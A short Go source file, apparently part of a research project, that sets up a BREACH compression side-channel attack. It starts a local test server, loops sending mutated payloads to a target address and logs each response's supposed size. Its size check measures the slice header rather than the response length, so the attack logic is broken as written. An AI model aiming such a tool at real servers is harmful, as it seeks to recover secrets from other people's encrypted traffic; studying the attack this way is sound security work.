package cryptopener

import (
	"log"
	"unsafe"

	client "github.com/larikuistio/cryptopener/client"
	testserver "github.com/larikuistio/cryptopener/testserver"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken []string
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) {
	size := unsafe.Sizeof(response)
	log.Printf("size: %d", size)
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	go testserver.TestServer()
	for {
		// create new payload
		payload, _ := p.mutator.NewPayload(false)
		log.Printf("Sending payload: %s", string(payload))
		// send payload into a socket and then response into channel
		response := p.client.SendMessage(string(payload))
		p.analyseResponse(response)
	}
}
